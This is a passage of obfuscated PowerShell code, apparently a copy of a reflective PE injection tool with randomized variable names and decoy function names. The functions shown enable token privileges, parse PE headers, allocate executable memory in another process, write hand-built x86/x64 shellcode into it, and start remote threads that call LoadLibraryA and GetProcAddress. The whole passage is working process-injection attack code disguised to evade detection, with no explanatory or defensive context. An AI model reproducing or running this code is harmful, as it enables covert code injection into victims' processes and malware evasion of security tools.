		}

		[UInt32]$Sovytbg9KQTLcaR = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$robWSZfqWDtAXZH.TOKEN_PRIVILEGES)
		[IntPtr]$99LXDZmNkkT9dlH = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Sovytbg9KQTLcaR)
		$NHcaTyVTsyGERI9 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($99LXDZmNkkT9dlH, [Type]$robWSZfqWDtAXZH.TOKEN_PRIVILEGES)
		$NHcaTyVTsyGERI9.PrivilegeCount = 1
		$NHcaTyVTsyGERI9.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$robWSZfqWDtAXZH.LUID)
		$NHcaTyVTsyGERI9.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($NHcaTyVTsyGERI9, $99LXDZmNkkT9dlH, $true)

		$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.AdjustTokenPrivileges.Invoke($bDuxnd9BxZeBAMs, $false, $99LXDZmNkkT9dlH, $Sovytbg9KQTLcaR, [IntPtr]::Zero, [IntPtr]::Zero)
		$MPoBck9NfvXbGrG = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($gtfwrZEdKIxfWbP -eq $false) -or ($MPoBck9NfvXbGrG -ne 0))
		{

		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($99LXDZmNkkT9dlH)
	}
	
	
	Function tented
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$DrOGwg9DdCngpap,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$EC9PzpHyqeHAmdO = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Y9kecWoe9UV9zmX
		)
		
		[IntPtr]$dYBizTpmpimSQXt = [IntPtr]::Zero
		
		$NieBhiJJdMbSfTE = [Environment]::OSVersion.Version

		if (($NieBhiJJdMbSfTE -ge (New-Object 'Version' 6,0)) -and ($NieBhiJJdMbSfTE -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$cuyR9MGQAPzXSIo= $Y9kecWoe9UV9zmX.NtCreateThreadEx.Invoke([Ref]$dYBizTpmpimSQXt, 0x1FFFFF, [IntPtr]::Zero, $DrOGwg9DdCngpap, $StartAddress, $EC9PzpHyqeHAmdO, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$KibXtHIqMX9PFMj = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($dYBizTpmpimSQXt -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $cuyR9MGQAPzXSIo. LastError: $KibXtHIqMX9PFMj"
			}
		}

		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$dYBizTpmpimSQXt = $Y9kecWoe9UV9zmX.CreateRemoteThread.Invoke($DrOGwg9DdCngpap, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $EC9PzpHyqeHAmdO, 0, [IntPtr]::Zero)
		}
		
		if ($dYBizTpmpimSQXt -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $dYBizTpmpimSQXt
	}

	

	Function threes
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$zmu9SojYFUP9iiK,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$robWSZfqWDtAXZH
		)
		
		$BKDbpoBM9gODleX = New-Object System.Object
		

		$nKjzgJQsPCVeQKn = [System.Runtime.InteropServices.Marshal]::PtrToStructure($zmu9SojYFUP9iiK, [Type]$robWSZfqWDtAXZH.IMAGE_DOS_HEADER)


		[IntPtr]$BMUxRjNhOrbvN9h = [IntPtr](protestation ([Int64]$zmu9SojYFUP9iiK) ([Int64][UInt64]$nKjzgJQsPCVeQKn.e_lfanew))
		$BKDbpoBM9gODleX | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $BMUxRjNhOrbvN9h
		$kMmC9NBWnsPRAxw = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BMUxRjNhOrbvN9h, [Type]$robWSZfqWDtAXZH.IMAGE_NT_HEADERS64)
		

	    if ($kMmC9NBWnsPRAxw.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($kMmC9NBWnsPRAxw.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$BKDbpoBM9gODleX | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $kMmC9NBWnsPRAxw
			$BKDbpoBM9gODleX | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$AIEaS9bQimRTeFS = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BMUxRjNhOrbvN9h, [Type]$robWSZfqWDtAXZH.IMAGE_NT_HEADERS32)
			$BKDbpoBM9gODleX | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $AIEaS9bQimRTeFS
			$BKDbpoBM9gODleX | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $BKDbpoBM9gODleX
	}



	Function adulterate
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$tJYsDb9BwcjqONx,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$robWSZfqWDtAXZH
		)
		
		$PEInfo = New-Object System.Object
		

		[IntPtr]$9vsJ99rOCDdOYNG = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tJYsDb9BwcjqONx.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($tJYsDb9BwcjqONx, 0, $9vsJ99rOCDdOYNG, $tJYsDb9BwcjqONx.Length) | Out-Null
		

		$BKDbpoBM9gODleX = threes -zmu9SojYFUP9iiK $9vsJ99rOCDdOYNG -robWSZfqWDtAXZH $robWSZfqWDtAXZH
		

		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($BKDbpoBM9gODleX.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($BKDbpoBM9gODleX.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($BKDbpoBM9gODleX.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($BKDbpoBM9gODleX.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($BKDbpoBM9gODleX.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		

		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($9vsJ99rOCDdOYNG)
		
		return $PEInfo
	}




	Function Bournemouth
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$zmu9SojYFUP9iiK,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$robWSZfqWDtAXZH,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($zmu9SojYFUP9iiK -eq $null -or $zmu9SojYFUP9iiK -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		

		$BKDbpoBM9gODleX = threes -zmu9SojYFUP9iiK $zmu9SojYFUP9iiK -robWSZfqWDtAXZH $robWSZfqWDtAXZH
		

		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $zmu9SojYFUP9iiK
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($BKDbpoBM9gODleX.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($BKDbpoBM9gODleX.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($BKDbpoBM9gODleX.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($BKDbpoBM9gODleX.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$cEDpWVfzLgd9RjG = [IntPtr](protestation ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$robWSZfqWDtAXZH.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $cEDpWVfzLgd9RjG
		}
		else
		{
			[IntPtr]$cEDpWVfzLgd9RjG = [IntPtr](protestation ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$robWSZfqWDtAXZH.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $cEDpWVfzLgd9RjG
		}
		
		if (($BKDbpoBM9gODleX.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($BKDbpoBM9gODleX.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function geeks
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$lhZ9id9GVAcGlDC,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$PCTVLoP9nzxygof
		)
		
		$tuIbncFQmkbV9im = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$9LB9KgCRTaWHgPg = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($PCTVLoP9nzxygof)
		$vrsSzDVwtAzpvPx = [UIntPtr][UInt64]([UInt64]$9LB9KgCRTaWHgPg.Length + 1)
		$wgwNaWZGhonQNz9 = $Y9kecWoe9UV9zmX.VirtualAllocEx.Invoke($lhZ9id9GVAcGlDC, [IntPtr]::Zero, $vrsSzDVwtAzpvPx, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($wgwNaWZGhonQNz9 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$VrbbNpbyeL9bLTo = [UIntPtr]::Zero
		$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.WriteProcessMemory.Invoke($lhZ9id9GVAcGlDC, $wgwNaWZGhonQNz9, $PCTVLoP9nzxygof, $vrsSzDVwtAzpvPx, [Ref]$VrbbNpbyeL9bLTo)
		
		if ($ZdXXNOZDYiFMcpk -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($vrsSzDVwtAzpvPx -ne $VrbbNpbyeL9bLTo)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$9leuC99eFUTSynG = $Y9kecWoe9UV9zmX.GetModuleHandle.Invoke("kernel32.dll")
		$TvYsGdTQZE99XUP = $Y9kecWoe9UV9zmX.GetProcAddress.Invoke($9leuC99eFUTSynG, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$uZedlgTfVWpZNPY = [IntPtr]::Zero


		if ($PEInfo.PE64Bit -eq $true)
		{

			$Xm9x9AkAiAuqqv9 = $Y9kecWoe9UV9zmX.VirtualAllocEx.Invoke($lhZ9id9GVAcGlDC, [IntPtr]::Zero, $vrsSzDVwtAzpvPx, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($Xm9x9AkAiAuqqv9 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			

			$KZPwnYGGnFqxNxC = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$ibgNfSXFUXztzSL = @(0x48, 0xba)
			$CCJUSo99FBaGPJd = @(0xff, 0xd2, 0x48, 0xba)
			$LXhtcP9SIXFJPNN = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$dTXQ9EtVRg9fbBo = $KZPwnYGGnFqxNxC.Length + $ibgNfSXFUXztzSL.Length + $CCJUSo99FBaGPJd.Length + $LXhtcP9SIXFJPNN.Length + ($tuIbncFQmkbV9im * 3)
			$TtStdBDOhXDvavu = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dTXQ9EtVRg9fbBo)
			$mGZewXxxxZtvCau = $TtStdBDOhXDvavu
			
			Wheaties -Bytes $KZPwnYGGnFqxNxC -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
			$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($KZPwnYGGnFqxNxC.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($wgwNaWZGhonQNz9, $TtStdBDOhXDvavu, $false)
			$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($tuIbncFQmkbV9im)
			Wheaties -Bytes $ibgNfSXFUXztzSL -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
			$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($ibgNfSXFUXztzSL.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($TvYsGdTQZE99XUP, $TtStdBDOhXDvavu, $false)
			$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($tuIbncFQmkbV9im)
			Wheaties -Bytes $CCJUSo99FBaGPJd -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
			$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($CCJUSo99FBaGPJd.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($Xm9x9AkAiAuqqv9, $TtStdBDOhXDvavu, $false)
			$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($tuIbncFQmkbV9im)
			Wheaties -Bytes $LXhtcP9SIXFJPNN -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
			$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($LXhtcP9SIXFJPNN.Length)

			
			$EVkVHH9TvNOKvDY = $Y9kecWoe9UV9zmX.VirtualAllocEx.Invoke($lhZ9id9GVAcGlDC, [IntPtr]::Zero, [UIntPtr][UInt64]$dTXQ9EtVRg9fbBo, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EVkVHH9TvNOKvDY -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.WriteProcessMemory.Invoke($lhZ9id9GVAcGlDC, $EVkVHH9TvNOKvDY, $mGZewXxxxZtvCau, [UIntPtr][UInt64]$dTXQ9EtVRg9fbBo, [Ref]$VrbbNpbyeL9bLTo)
			if (($ZdXXNOZDYiFMcpk -eq $false) -or ([UInt64]$VrbbNpbyeL9bLTo -ne [UInt64]$dTXQ9EtVRg9fbBo))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$AYKjfEMrJMj9fB9 = tented -DrOGwg9DdCngpap $lhZ9id9GVAcGlDC -StartAddress $EVkVHH9TvNOKvDY -Y9kecWoe9UV9zmX $Y9kecWoe9UV9zmX
			$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.WaitForSingleObject.Invoke($AYKjfEMrJMj9fB9, 20000)
			if ($gtfwrZEdKIxfWbP -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			

			[IntPtr]$G9CrPkUjFrzx9OP = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tuIbncFQmkbV9im)
			$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.ReadProcessMemory.Invoke($lhZ9id9GVAcGlDC, $Xm9x9AkAiAuqqv9, $G9CrPkUjFrzx9OP, [UIntPtr][UInt64]$tuIbncFQmkbV9im, [Ref]$VrbbNpbyeL9bLTo)
			if ($gtfwrZEdKIxfWbP -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$uZedlgTfVWpZNPY = [System.Runtime.InteropServices.Marshal]::PtrToStructure($G9CrPkUjFrzx9OP, [Type][IntPtr])

			$Y9kecWoe9UV9zmX.VirtualFreeEx.Invoke($lhZ9id9GVAcGlDC, $Xm9x9AkAiAuqqv9, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Y9kecWoe9UV9zmX.VirtualFreeEx.Invoke($lhZ9id9GVAcGlDC, $EVkVHH9TvNOKvDY, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$AYKjfEMrJMj9fB9 = tented -DrOGwg9DdCngpap $lhZ9id9GVAcGlDC -StartAddress $TvYsGdTQZE99XUP -EC9PzpHyqeHAmdO $wgwNaWZGhonQNz9 -Y9kecWoe9UV9zmX $Y9kecWoe9UV9zmX
			$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.WaitForSingleObject.Invoke($AYKjfEMrJMj9fB9, 20000)
			if ($gtfwrZEdKIxfWbP -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$pyCvMfxudgqmIbc = 0
			$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.GetExitCodeThread.Invoke($AYKjfEMrJMj9fB9, [Ref]$pyCvMfxudgqmIbc)
			if (($gtfwrZEdKIxfWbP -eq 0) -or ($pyCvMfxudgqmIbc -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$uZedlgTfVWpZNPY = [IntPtr]$pyCvMfxudgqmIbc
		}
		
		$Y9kecWoe9UV9zmX.VirtualFreeEx.Invoke($lhZ9id9GVAcGlDC, $wgwNaWZGhonQNz9, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $uZedlgTfVWpZNPY
	}
	
	
	Function eyebrow
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$lhZ9id9GVAcGlDC,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$SCvdFzGjX99EQSr,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)

		$tuIbncFQmkbV9im = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$MOlUcJRMqqMKboW = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		

		$TxSZmwPsoiuOnHm = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$JM9noyiuiHboyoa = $Y9kecWoe9UV9zmX.VirtualAllocEx.Invoke($lhZ9id9GVAcGlDC, [IntPtr]::Zero, $TxSZmwPsoiuOnHm, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($JM9noyiuiHboyoa -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$VrbbNpbyeL9bLTo = [UIntPtr]::Zero
		$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.WriteProcessMemory.Invoke($lhZ9id9GVAcGlDC, $JM9noyiuiHboyoa, $MOlUcJRMqqMKboW, $TxSZmwPsoiuOnHm, [Ref]$VrbbNpbyeL9bLTo)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($MOlUcJRMqqMKboW)
		if ($ZdXXNOZDYiFMcpk -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($TxSZmwPsoiuOnHm -ne $VrbbNpbyeL9bLTo)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		

		$9leuC99eFUTSynG = $Y9kecWoe9UV9zmX.GetModuleHandle.Invoke("kernel32.dll")
		$Zxzhkab9mtSECAE = $Y9kecWoe9UV9zmX.GetProcAddress.Invoke($9leuC99eFUTSynG, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		

		$Lk9ccvUJHrWhhaT = $Y9kecWoe9UV9zmX.VirtualAllocEx.Invoke($lhZ9id9GVAcGlDC, [IntPtr]::Zero, [UInt64][UInt64]$tuIbncFQmkbV9im, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($Lk9ccvUJHrWhhaT -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		



		[Byte[]]$cYaJDIk9YWWntMY = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$zhavuWBdIK9twcD = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$9wDuonNAWlrFfCk = @(0x48, 0xba)
			$derKvojYGqQoyqh = @(0x48, 0xb8)
			$ukrkKnOHNOCRoDZ = @(0xff, 0xd0, 0x48, 0xb9)
			$rZJL9lq9lcCSuqO = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$zhavuWBdIK9twcD = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$9wDuonNAWlrFfCk = @(0xb9)
			$derKvojYGqQoyqh = @(0x51, 0x50, 0xb8)
			$ukrkKnOHNOCRoDZ = @(0xff, 0xd0, 0xb9)
			$rZJL9lq9lcCSuqO = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$dTXQ9EtVRg9fbBo = $zhavuWBdIK9twcD.Length + $9wDuonNAWlrFfCk.Length + $derKvojYGqQoyqh.Length + $ukrkKnOHNOCRoDZ.Length + $rZJL9lq9lcCSuqO.Length + ($tuIbncFQmkbV9im * 4)
		$TtStdBDOhXDvavu = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dTXQ9EtVRg9fbBo)
		$mGZewXxxxZtvCau = $TtStdBDOhXDvavu
		
		Wheaties -Bytes $zhavuWBdIK9twcD -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
		$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($zhavuWBdIK9twcD.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($SCvdFzGjX99EQSr, $TtStdBDOhXDvavu, $false)
		$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($tuIbncFQmkbV9im)
		Wheaties -Bytes $9wDuonNAWlrFfCk -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
		$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($9wDuonNAWlrFfCk.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($JM9noyiuiHboyoa, $TtStdBDOhXDvavu, $false)
		$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($tuIbncFQmkbV9im)
		Wheaties -Bytes $derKvojYGqQoyqh -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
		$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($derKvojYGqQoyqh.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($Zxzhkab9mtSECAE, $TtStdBDOhXDvavu, $false)
		$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($tuIbncFQmkbV9im)
		Wheaties -Bytes $ukrkKnOHNOCRoDZ -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
		$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($ukrkKnOHNOCRoDZ.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($Lk9ccvUJHrWhhaT, $TtStdBDOhXDvavu, $false)
		$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($tuIbncFQmkbV9im)
		Wheaties -Bytes $rZJL9lq9lcCSuqO -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
		$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($rZJL9lq9lcCSuqO.Length)
		
		$EVkVHH9TvNOKvDY = $Y9kecWoe9UV9zmX.VirtualAllocEx.Invoke($lhZ9id9GVAcGlDC, [IntPtr]::Zero, [UIntPtr][UInt64]$dTXQ9EtVRg9fbBo, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($EVkVHH9TvNOKvDY -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.WriteProcessMemory.Invoke($lhZ9id9GVAcGlDC, $EVkVHH9TvNOKvDY, $mGZewXxxxZtvCau, [UIntPtr][UInt64]$dTXQ9EtVRg9fbBo, [Ref]$VrbbNpbyeL9bLTo)
		if (($ZdXXNOZDYiFMcpk -eq $false) -or ([UInt64]$VrbbNpbyeL9bLTo -ne [UInt64]$dTXQ9EtVRg9fbBo))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$AYKjfEMrJMj9fB9 = tented -DrOGwg9DdCngpap $lhZ9id9GVAcGlDC -StartAddress $EVkVHH9TvNOKvDY -Y9kecWoe9UV9zmX $Y9kecWoe9UV9zmX
		$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.WaitForSingleObject.Invoke($AYKjfEMrJMj9fB9, 20000)
		if ($gtfwrZEdKIxfWbP -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		

		[IntPtr]$G9CrPkUjFrzx9OP = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tuIbncFQmkbV9im)
		$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.ReadProcessMemory.Invoke($lhZ9id9GVAcGlDC, $Lk9ccvUJHrWhhaT, $G9CrPkUjFrzx9OP, [UIntPtr][UInt64]$tuIbncFQmkbV9im, [Ref]$VrbbNpbyeL9bLTo)
		if (($gtfwrZEdKIxfWbP -eq $false) -or ($VrbbNpbyeL9bLTo -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$zRSqvGhBhnXMepu = [System.Runtime.InteropServices.Marshal]::PtrToStructure($G9CrPkUjFrzx9OP, [Type][IntPtr])

		$Y9kecWoe9UV9zmX.VirtualFreeEx.Invoke($lhZ9id9GVAcGlDC, $EVkVHH9TvNOKvDY, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Y9kecWoe9UV9zmX.VirtualFreeEx.Invoke($lhZ9id9GVAcGlDC, $JM9noyiuiHboyoa, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Y9kecWoe9UV9zmX.VirtualFreeEx.Invoke($lhZ9id9GVAcGlDC, $Lk9ccvUJHrWhhaT, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $zRSqvGhBhnXMepu
	}


	Function pokier
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$tJYsDb9BwcjqONx,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Y9kecWoe9UV9zmX,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$robWSZfqWDtAXZH
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$cEDpWVfzLgd9RjG = [IntPtr](protestation ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$robWSZfqWDtAXZH.IMAGE_SECTION_HEADER)))
			$TAz9WVtnsrQiTzQ = [System.Runtime.InteropServices.Marshal]::PtrToStructure($cEDpWVfzLgd9RjG, [Type]$robWSZfqWDtAXZH.IMAGE_SECTION_HEADER)
		

			[IntPtr]$IhWAxsMLhjsfNzn = [IntPtr](protestation ([Int64]$PEInfo.PEHandle) ([Int64]$TAz9WVtnsrQiTzQ.VirtualAddress))
			




			$nGUhoxoFNc9lWsQ = $TAz9WVtnsrQiTzQ.SizeOfRawData

			if ($TAz9WVtnsrQiTzQ.PointerToRawData -eq 0)
			{
				$nGUhoxoFNc9lWsQ = 0
			}
			
			if ($nGUhoxoFNc9lWsQ -gt $TAz9WVtnsrQiTzQ.VirtualSize)
			{
				$nGUhoxoFNc9lWsQ = $TAz9WVtnsrQiTzQ.VirtualSize
			}
			
			if ($nGUhoxoFNc9lWsQ -gt 0)
			{
